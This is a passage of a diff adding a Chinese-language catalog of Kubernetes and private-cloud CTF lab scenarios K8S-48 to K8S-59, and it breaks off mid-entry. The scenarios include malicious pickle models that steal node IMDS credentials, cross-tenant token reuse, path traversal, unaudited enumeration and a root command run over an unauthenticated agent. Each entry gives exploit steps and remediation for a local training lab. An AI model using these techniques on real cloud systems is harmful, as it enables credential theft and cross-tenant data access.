+- 验收：`python3 scripts/validate-cloud-gate.py k8s-48 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-48 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Build fleet runner, OCI image registry, and tenant pulls |
+| 侦察与前置条件 | RUN instruction execution and internal registry authorization model |
+| 核心漏洞与利用 | Execute a build job and overwrite a trusted internal image |
+| 权限、横向或影响 | Cross-tenant supply-chain execution |
+| 验证 | Trigger the tenant pull and capture the resulting flag |
+
+**修复建议**
+
+内部 registry 必须按租户/项目做鉴权与不可变 tag；构建机不得持有
+可写内部 registry 的凭据；供应链信任要显式化。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-49"></a>
+
+### K8S-49 · 模型加载 → 推理 Pod → 节点元数据
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-49 |
+| 名称 | Malicious Model Loading → Inference Pod → Node Metadata |
+| 交付方式 | docker |
+| 难度 | L2 |
+| 技术/CVE | N/A (pickle deserialization, case #091) |
+| 入口 | `localhost:10630` |
+| 目录 | `scenarios/k8s/pickle-model` |
+
+**场景概述**
+
+私有云推理平台加载租户上传的 PyTorch/pickle 模型，扫描器仅告警而不阻断。
+恶意模型在推理 pod 内执行代码并访问节点元数据，取得节点平台身份后读取集群 Secret。
+
+**教材锚点**
+
+- 案例：Hugging Face gpt2 恶意 pickle（#091）；推理 pod 逃逸（Ch10）
+- 平面：数据面（推理）→ 宿主/节点 → 失败边界：命名空间/身份
+- 六镜头：MAGIC（托管推理是"运行你给的代码"这一产品本身）；
+  DETECTION（扫描器是警告不是门禁）
+
+**前置知识 / 条件**
+
+- Python pickle 反序列化（`__reduce__`）
+- 节点 IMDS 与节点 IAM 角色；EKS 集群凭据
+
+**利用步骤**
+
+1. 构造 `__reduce__` 返回 `subprocess.check_output(cmd)` 的 pickle，
+   命令为访问节点 IMDS 的 Python 代码。
+2. 上传模型——注册表返回"dangerous pickle detected"，但**仍接受**。
+3. 调用 `/infer` 触发加载，命令输出（节点角色名）作为推理结果返回。
+4. 再上传一个窃取凭据的模型，拿到节点 AccessKey/SecretKey/Token。
+5. 用节点 Token 调集群 `/secrets`，读到 Secret 与 flag。
+6. 终端服务 cluster-api 向 flag-vault 出示节点身份 Bearer 令牌，换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 cluster-api 向 flag-vault 出示「节点身份 Bearer 令牌」（校验模式 `header-secret`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-49-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-49 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-49 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Python pickle, model registry, inference pod, and node IMDS |
+| 侦察与前置条件 | Model upload/deserialization flow and pod credential exposure |
+| 核心漏洞与利用 | Upload a malicious pickle model |
+| 权限、横向或影响 | Inference pod execution followed by node metadata credential access |
+| 验证 | Use the model/IMDS result to read the flag |
+
+**修复建议**
+
+推理平台应使用非 pickle 格式（safetensors）或隔离沙箱加载；扫描器
+必须能拦截；推理 pod 不应能访问节点 IMDS。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-50"></a>
+
+### K8S-50 · 可预测卷 ID + 属主校验缺失
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-50 |
+| 名称 | Predictable Volume ID + Missing Ownership Check |
+| 交付方式 | docker |
+| 难度 | L2 |
+| 技术/CVE | N/A (control-plane ownership check missing) |
+| 入口 | `localhost:10631` |
+| 目录 | `scenarios/k8s/attachme-volume` |
+
+**场景概述**
+
+私有云块存储控制面按可预测格式分配卷 ID，AttachVolume 接口不校验调用者是否为卷属主。
+攻击者枚举受害者卷并附加到自己的实例，读取卷内数据。
+
+**教材锚点**
+
+- 案例：AttachMe（可预测 OCID + 缺失授权检查，Ch11 Breakdown 3）
+- 平面：控制面（块存储 API）→ 失败边界：账号/属主
+- 六镜头：IDENTITY（API 不复检调用者身份）；BOUNDARY（属主校验缺失）；
+  DETECTION（控制面调用会产生审计，但属主校验缺陷本身无感知）
+
+**前置知识 / 条件**
+
+- 控制面 API 的资源 ID 结构与可预测性
+- "属主校验"与"认证"是两个不同控制点
+
+**利用步骤**
+
+1. 阅读控制面文档，了解 ID 格式 `ocid.vol.<4位>`。
+2. 枚举/猜测 `ocid.vol.1001`，查询详情确认属主是 victim-tenant。
+3. 调用 `/attach` 把该卷附加到攻击者实例（无属主校验）。
+4. 从实例读取卷数据，得到 flag。
+5. 终端服务 control-api 向 flag-vault 出示块存储控制面内网地址，换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 control-api 向 flag-vault 出示「块存储控制面内网地址」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-50-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-50 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-50 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Private-cloud block-volume control plane, volume IDs, and instance attachment |
+| 侦察与前置条件 | Predictable volume identifier pattern and ownership validation behavior |
+| 核心漏洞与利用 | Request attachment of a victim volume by ID |
+| 权限、横向或影响 | Cross-tenant block storage access |
+| 验证 | Mount/read the attached volume flag |
+
+**修复建议**
+
+AttachVolume 必须校验卷属主与调用者一致；资源 ID 应不可预测
+（足够熵）；控制面 API 默认 deny。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-51"></a>
+
+### K8S-51 · 目录 Actor Token → 跨租户身份混淆
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-51 |
+| 名称 | Directory Actor Token: Cross-Tenant Identity Confusion |
+| 交付方式 | docker |
+| 难度 | L2 |
+| 技术/CVE | N/A (actor/tenant validation bug, case #246) |
+| 入口 | `localhost:10632` |
+| 目录 | `scenarios/k8s/actor-token` |
+
+**场景概述**
+
+私有云目录 API 只校验 JWT 签名，不比对 token 租户与目标租户。
+攻击者使用 tenant-a 的有效 token 访问 tenant-b 的目录，以错误身份读取其他租户数据。
+
+**教材锚点**
+
+- 案例：Entra ID actor token 校验缺陷导致跨租户全局管理员（#246）
+- 平面：控制面（身份）→ 失败边界：身份/账号
+- 六镜头：IDENTITY（签名有效 ≠ 主体有权访问目标租户）；BOUNDARY（租户
+  边界靠 claim 校验，而该校验缺失）
+
+**前置知识 / 条件**
+
+- JWT 结构与签名验证；OAuth/目录服务的 tenant 绑定（issuer/audience/actor）
+
+**利用步骤**
+
+1. 从身份服务为 `tenant-a` 获取签名 token。
+2. 携带该 token 请求 `GET /api/users?tenant=tenant-b`。
+3. 服务端仅验签、不比对 token 租户，返回 tenant-b 的用户列表与 flag。
+4. 终端服务 directory-api 向 flag-vault 出示本租户令牌（HS256），换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 directory-api 向 flag-vault 出示「本租户令牌（HS256）」（校验模式 `jwt`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-51-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-51 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-51 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Directory actor tokens, tenant claims, and private directory APIs |
+| 侦察与前置条件 | Actor/tenant claim handling across directory endpoints |
+| 核心漏洞与利用 | Present a Tenant-A actor token to a Tenant-B operation |
+| 权限、横向或影响 | Cross-tenant identity confusion |
+| 验证 | Use the accepted token to retrieve the tenant flag |
+
+**修复建议**
+
+令牌校验必须同时验证 tenant/issuer/audience 与被访问资源一致；actor
+与 subject 分离校验；跨租户访问一律默认拒绝。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-52"></a>
+
+### K8S-52 · 平台中间件无鉴权管理通道 → VM Root
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-52 |
+| 名称 | Platform Middleware Unauth Management Channel → VM Root |
+| 交付方式 | docker |
+| 难度 | L2 |
+| 技术/CVE | N/A (auth bypass in platform agent, CVE-2021-38647 lineage) |
+| 入口 | `localhost:10633` |
+| 目录 | `scenarios/k8s/omigod-agent` |
+
+**场景概述**
+
+平台运营方在租户 VM 上部署受管中间件代理，但管理端口不做认证。
+攻击者可访问该内部通道并以 root 执行命令，从平台密钥库读取受保护资源。
+
+**教材锚点**
+
+- 案例：OMIGOD（#057/#087）；RHUI（#068）
+- 平面：控制面（供应商代理）→ 失败边界：网络 + provider-side
+- 六镜头：MAGIC（供应商自动化以 root 运行）；SHARED（代理安装在所有
+  租户 VM 上，爆炸半径为"所有租户"）；DETECTION（客户不感知代理存在，
+  也无补丁责任）
+
+**前置知识 / 条件**
+
+- 平台中间件 / 共享责任模型中的盲区
+- 无鉴权管理端口的利用
+
+**利用步骤**
+
+1. 扫描内部 VM，发现 vm-b 的 5986 端口开放且 banner 显示 platform middleware agent。
+2. 直接 POST `/wsman/exec`（无需任何凭据）执行命令：先确认 root 身份，再从中间件容器里
+   向平台密钥库取密文（该密钥库只对 omi-agent 的地址开放）：
+   `id; python3 -c "import urllib.request;print(urllib.request.urlopen('http://flag-vault:5000/flag').read().decode())"`
+3. 以 root 拿到 VM 上的 flag。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 omi-agent 向 flag-vault 出示「中间件代理内网地址（未鉴权通道拿到 root 后取）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-52-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-52 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-52 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Cloud middleware agent management API and VM services |
+| 侦察与前置条件 | Unauthenticated management endpoint discovery |
+| 核心漏洞与利用 | Call the vulnerable platform middleware management channel |
+| 权限、横向或影响 | VM root-level command execution |
+| 验证 | Execute the agent command path to read the flag |
+
+**修复建议**
+
+管理通道必须强认证 + 双向 TLS；平台运营方部署的中间件要纳入客户补丁
+可见性；5986 等管理端口不得对租户网络开放。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-53"></a>
+
+### K8S-53 · IAM 枚举 2.0 → 无审计 AccessDenied Oracle
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-53 |
+| 名称 | IAM Enumeration 2.0: Unlogged AccessDenied Oracle |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (uncovered service error oracle, case #134/#137) |
+| 入口 | `localhost:10634` |
+| 目录 | `scenarios/k8s/iam-enum-oracle` |
+
+**场景概述**
+
+私有云审计服务未覆盖所有 IAM 兼容 API：AccessDenied 仍返回调用者身份，却不产生审计事件。
+攻击者利用错误差异枚举角色；AssumeRole 的失败响应也可区分角色存在性。
+
+**教材锚点**
+
+- 案例：IAM enumeration 2.0（#134）；AssumeRole 角色枚举（#137）
+- 平面：控制面（枚举）→ 失败边界：检测（no-event 层）
+- 六镜头：DETECTION（无事件即不可见）；IDENTITY（错误信息泄露主体身份）
+
+**前置知识 / 条件**
+
+- 私有云审计服务 覆盖范围与"无事件层"
+- 错误差分 oracle（verbose error differential）
+
+**利用步骤**
+
+1. 用泄露的密钥调用未记录 API `/api/unsupported`——AccessDenied 返回
+   完整 ARN，且审计日志无记录。
+2. 对单词表逐个调用公开 STS 入口 `http://localhost:10723/assume-role`，
+   比对错误信息差异，确认存在的角色
+   （AdminRole / SecretRole / DataPipelineRole）。
+3. 验证「未记录层」：按端点过滤查询公开审计入口——
+   `http://audit-log:5000/logs?path=/api/unsupported` 返回 0 条记录，
+   并返回动态 Flag；对照 `http://audit-log:5000/logs?path=/api/supported`
+   会返回 ≥1 条记录，证明 `control-api` 已公布的 `/api/supported` 是
+   **被审计覆盖**的端点。
+
+> 审计 Flag 的判定条件是「指定端点没有任何审计条目」，而不是「审计日志
+> 整体为空」。因此先探测 `/api/supported` 不会打掉 Flag——它只是对照组，
+> 说明被覆盖的 API 会留痕。
+4. 终端服务 audit-log 向 flag-vault 出示审计服务内网地址（零审计条目的过滤查询），换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 audit-log 向 flag-vault 出示「审计服务内网地址（零审计条目的过滤查询）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-53-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-53 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-53 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | IAM APIs, AccessDenied responses, and STS role assumption |
+| 侦察与前置条件 | Role/user candidate generation and response-difference analysis |
+| 核心漏洞与利用 | Use an unlogged AccessDenied oracle to enumerate valid identities |
+| 权限、横向或影响 | Stealthy identity reconnaissance and role targeting |
+| 验证 | Assume/enumerate the discovered identity to obtain the flag |
+
+**修复建议**
+
+所有 API 都应被审计（含错误响应）；错误信息不得携带调用者 ARN；
+AssumeRole 失败信息统一（feature-inherent oracle 需在设计上消除）。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-54"></a>
+
+### K8S-54 · 私有 Service Catalog → 非生产端点不可见写
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-54 |
+| 名称 | Private Service Catalog Beta Endpoint: Invisible Write |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (non-production endpoint skips audit, case #154) |
+| 入口 | `localhost:10635` |
+| 目录 | `scenarios/k8s/beta-endpoint` |
+
+**场景概述**
+
+私有云 Service Catalog 控制台暴露非生产 beta 端点，该端点接受生产凭据并执行真实写操作，
+却不经过统一审计管线。攻击者据此完成不可见状态变更并访问新建资源。
+
+**教材锚点**
+
+- 案例：Bypassing CloudTrail in AWS Service Catalog（#154）
+- 平面：控制面（写操作）→ 失败边界：检测（日志路由）
+- 六镜头：DETECTION（beta 端点绕过生产日志管线）；MAGIC（非生产
+  基础设施与生产共享凭据）
+
+**前置知识 / 条件**
+
+- 控制台 CSP 头可泄露内部端点；非生产环境的审计盲区
+
+**利用步骤**
+
+1. 读取控制台页面（`localhost:10727`）源码，从 CSP `connect-src` 中发现
+   beta 端点 `aws242-servicecatalog-beta`；页面 bundle 同时泄露了生产
+   端点使用的共享凭据（`X-Api-Key: valid-sigv4`）。
+2. 用该凭据向 production 端点（`localhost:10729`）POST `/portfolios`
+   建立基线——写入成功，并产生一条审计事件。
+3. 用同一凭据向 beta 端点（入口 `localhost:10635`）POST `/portfolios`：
+   创建成功，响应只返回 `portfolio_id`，且**不产生新的审计事件**。
+4. 用同一凭据 `GET /portfolios/<portfolio_id>` 读取资源，获得 flag。
+5. 查询 `audit-log:5000/logs`：审计计数相比第 2 步没有增长，写操作完全
+   不可见。
+
+> 无凭据或错误凭据的请求返回 403——本场景刻画的是“审计盲区”而非
+> “未鉴权接口”，因此调用者校验与生产端点保持一致。
+6. 终端服务 beta-api 向 flag-vault 出示beta 端点内网地址（不可见写入），换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 beta-api 向 flag-vault 出示「beta 端点内网地址（不可见写入）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-54-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-54 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-54 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Service catalog control plane, beta APIs, and audit logging |
+| 侦察与前置条件 | Production/beta endpoint discovery and audit event comparison |
+| 核心漏洞与利用 | Send a write through the non-production endpoint |
+| 权限、横向或影响 | Unaudited control-plane state change |
+| 验证 | Verify the hidden write/flag while confirming the audit blind spot |
+
+**修复建议**
+
+非生产端点必须走同一审计管线；CSP 不应暴露内部域名；beta 端点
+不得接受生产凭据执行真实写操作。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-55"></a>
+
+### K8S-55 · Resource Explorer → 特性固有静默枚举
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-55 |
+| 名称 | Resource Explorer: Feature-Inherent Quiet Enumeration |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (unlogged search API, case #148) |
+| 入口 | `localhost:10636` |
+| 目录 | `scenarios/k8s/resource-explorer` |
+
+**场景概述**
+
+私有私有云资源搜索服务索引租户内资源，但查询操作不产生审计事件。
+攻击者以静默方式取得资源拓扑，再定位并读取敏感资源。
+
+**教材锚点**
+
+- 案例：Enumerating AWS the quiet way: Resource Explorer（#148）
+- 平面：控制面（搜索 API）→ 失败边界：检测（特性固有盲区）
+- 六镜头：DETECTION（搜索 API 不产事件，且无法通过客户配置补上）；
+  SHARED（资源索引聚合了所有资源元数据）
+
+**前置知识 / 条件**
+
+- 资源搜索/探索类服务的审计覆盖差异
+
+**利用步骤**
+
+1. 用空查询/关键词（prod、role、flag）调用 `/search`，枚举全部资源。
+2. 调用 `/whoami` 取得调用者上下文（`caller_arn`，即 `X-Caller-ARN`
+   需要携带的值）。
+3. 搜索只返回资源元数据（不含 secret）；发现 `flag-store` 后，携带
+   该 `caller_arn` 请求 `/resources/s-001` 读取详情，获得 flag；
+   缺少调用者上下文时返回 403。
+4. 检查公开审计入口 `http://audit-log:5000/logs`：审计为 0，枚举不可见。
+5. 终端服务 explorer-api 向 flag-vault 出示资源浏览器内网地址（静默读取），换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 explorer-api 向 flag-vault 出示「资源浏览器内网地址（静默读取）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-55-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-55 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-55 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Cloud resource explorer/search API and tenant inventory |
+| 侦察与前置条件 | Search query semantics and audit visibility |
+| 核心漏洞与利用 | Enumerate resources through the feature-inherent quiet API |
+| 权限、横向或影响 | Stealthy cloud resource discovery |
+| 验证 | Use discovered resource metadata to recover the flag |
+
+**修复建议**
+
+搜索 API 也应记录操作者与查询；敏感资源（凭据存储）不应出现在
+默认索引中。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-56"></a>
+
+### K8S-56 · 低代码连接器密钥 → 私有控制面外泄
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-56 |
+| 名称 | Low-Code Connector Secrets via Private Control Plane |
+| 交付方式 | docker |
+| 难度 | L2 |
+| 技术/CVE | N/A (connector store tenant-scope missing, case #249/#197) |
+| 入口 | `localhost:10638` |
+| 目录 | `scenarios/k8s/lowcode-secrets` |
+
+**场景概述**
+
+企业低代码平台的连接器存储是跨项目共享控制面，但列表和详情接口不校验调用者租户。
+攻击者可直接读取其他租户连接器及其密钥。
+
+**教材锚点**
+
+- 案例：Silent Reaper（#249）；API Connections 跨租户（#197）；
+  Vault Recon（#250）
+- 平面：控制面（连接器存储）→ 失败边界：账号/共享组件
+- 六镜头：SHARED（连接器存储是供应商侧共享组件，爆炸半径为所有租户）；
+  IDENTITY（列表/读取端点不校验调用者租户）
+
+**前置知识 / 条件**
+
+- 低代码平台连接器与托管身份模型；控制面 API 的租户 scope
+
+**利用步骤**
+
+1. 调用 `GET /api/connections` 列出连接器——发现 tenant-b 的
+   SharePoint 连接器。
+2. 调用 `GET /api/connections/conn-1002` 直接读取 secret。
+3. secret 中携带 flag。
+4. 终端服务 connector-store 向 flag-vault 出示连接器控制面内网地址（跨租户读取），换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 connector-store 向 flag-vault 出示「连接器控制面内网地址（跨租户读取）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-56-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-56 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-56 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Low-code connector control plane and secret storage |
+| 侦察与前置条件 | Connector identifier/tenant scope behavior |
+| 核心漏洞与利用 | Request a connector secret outside the caller tenant |
+| 权限、横向或影响 | Cross-tenant credential disclosure |
+| 验证 | Read the returned connector secret/flag |
+
+**修复建议**
+
+控制面读取必须按调用者租户过滤；连接器密钥不应通过列表/详情 API
+返回明文；密钥应加密并短时效轮换。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-57"></a>
+
+### K8S-57 · 共享 NAT 出口 → 源 IP 白名单绕过
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-57 |
+| 名称 | Shared NAT Egress: Source-IP Allowlist Bypass |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (service-tag source-IP trust, case #259) |
+| 入口 | `localhost:10639` |
+| 目录 | `scenarios/k8s/shared-nat` |
+
+**场景概述**
+
+私有云平台运营方为多个租户提供共享 NAT 出口，并把对应地址段视为可信服务前缀。
+攻击者租户通过该出口访问受害者接口时，源 IP 落入白名单，从而绕过网络软边界。
+
+**教材锚点**
+
+- 案例：Abusing Service Tags to bypass Azure Firewall（#259）
+- 平面：数据面（网络）→ 失败边界：网络软边界
+- 六镜头：BOUNDARY（源 IP 不是身份）；SHARED（托管 NAT 是共享出口，
+  受信地址段被多租户共用）
+
+**前置知识 / 条件**
+
+- 基于源 IP 的防火墙与"服务标签/地址段"信任模型
+
+**利用步骤**
+
+1. 直接访问受害者 `/flag`——源 IP 不在受信段，403。
+2. 调用共享 NAT `/egress` 代理访问受害者 `/flag`——出口源 IP
+   落在 168.63.0.0/24 受信段，返回 flag。
+3. 终端服务 victim-api 向 flag-vault 出示受保护接口内网地址（经共享 NAT 出口），换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 victim-api 向 flag-vault 出示「受保护接口内网地址（经共享 NAT 出口）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-57-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-57 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-57 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Shared NAT egress, HTTP forwarding, and source-IP allowlists |
+| 侦察与前置条件 | Trusted platform address range and target firewall policy |
+| 核心漏洞与利用 | Route a request through the shared NAT |
+| 权限、横向或影响 | Bypass source-IP-based trust boundary |
+| 验证 | Read the protected API response containing the flag |
+
+**修复建议**
+
+防火墙不要基于源 IP/服务标签做信任决策；服务地址段不能与租户
+共享出口混用；对敏感服务使用身份级认证。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-58"></a>
+
+### K8S-58 · 托管数据工作流 → 跨租户路径穿越
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-58 |
+| 名称 | Managed Data Workflow → Cross-Tenant Path Traversal |
+| 交付方式 | docker |
+| 难度 | L2 |
+| 技术/CVE | N/A (cross-tenant path traversal, case #267) |
+| 入口 | `localhost:10640` |
+| 目录 | `scenarios/k8s/dataform-pt` |
+
+**场景概述**
+
+私有云数据工作流服务把所有租户工作区放在同一共享执行器上，dataset 路径缺少租户根目录校验。
+攻击者提交 `../` 引用即可读写其他租户工作区。
+
+**教材锚点**
+
+- 案例：Dataform cross-tenant path traversal（#267）
+- 平面：数据面（管线执行）→ 失败边界：命名空间/账号
+- 六镜头：SHARED（共享执行器承载所有租户工作区）；BOUNDARY（路径
+  规范化未加租户容器约束）
+
+**前置知识 / 条件**
+
+- 路径穿越；托管数据服务的多租户工作区模型
+
+**利用步骤**
+
+1. 查看控制面文档，确认所有租户在同一共享执行器上。
+2. 提交 workflow：`workspace=tenant-a`，
+   `dataset_ref=../tenant-b/secret.txt`（从本租户工作区逃逸到相邻租户）。
+3. 执行器解析出 `tenant-b/secret.txt`，返回内容与 flag。
+4. 终端服务 shared-executor 向 flag-vault 出示共享执行器内网地址（路径逃出本租户工作区），换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 shared-executor 向 flag-vault 出示「共享执行器内网地址（路径逃出本租户工作区）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-58-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-58 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-58 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Managed data workflows, shared executor, and filesystem paths |
+| 侦察与前置条件 | Workspace root construction and dataset_ref normalization behavior |
+| 核心漏洞与利用 | Use ../ traversal in a dataset reference |
+| 权限、横向或影响 | Cross-tenant workspace file disclosure |
+| 验证 | Read the victim workspace secret/flag |
+
+**修复建议**
+
+路径必须先规范化再校验是否仍位于本租户工作区根目录内；执行器
+按租户隔离（沙箱/容器）。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-59"></a>
+
+### K8S-59 · 私有云无服务器默认服务账号提权
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-59 |
+| 名称 | Serverless Default Service Account: Platform Identity Escalation |
+| 交付方式 | docker |
+| 难度 | L2 |
+| 技术/CVE | N/A (over-scoped default SA, case #266/#272) |
+| 入口 | `localhost:10641` |
+| 目录 | `scenarios/k8s/serverless-sa` |
+
+**场景概述**
+
+私有云无服务器平台自动以默认服务账号运行租户函数，该身份权限过宽。
+攻击者部署恶意函数后继承默认身份，直接读取其他项目的 Secret。
+
+**教材锚点**
+
+- 案例：ImageRunner（#266）；GCP Cloud Functions 提权（#272）
+- 平面：控制面（平台身份）→ 失败边界：身份
+- 六镜头：IDENTITY（默认 SA 过宽且平台自动注入）；MAGIC（函数执行
+  即自动化以服务身份运行）
+
+**前置知识 / 条件**
+
+- 无服务器运行时身份（默认服务账号）与最小权限
+
+**利用步骤**
+
+1. 部署恶意函数，代码读取运行环境中的 `DEFAULT_SA_TOKEN`。
+2. 函数输出默认服务账号令牌。
+3. 用该令牌调用受害者项目 `/api/projects/victim/secrets`，
+   读到 Secret 与 flag。
+4. 终端服务 victim-project 向 flag-vault 出示平台默认服务账号令牌，换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 victim-project 向 flag-vault 出示「平台默认服务账号令牌」（校验模式 `header-secret`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-59-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-59 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-59 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Serverless functions, default ServiceAccounts, and project IAM |
+| 侦察与前置条件 | Default service account scopes and invoker/deployer permissions |
+| 核心漏洞与利用 | Invoke or deploy through an over-scoped default identity |
+| 权限、横向或影响 | Platform identity privilege escalation |
+| 验证 | Use the service account authority to retrieve the flag |
+
+**修复建议**
+
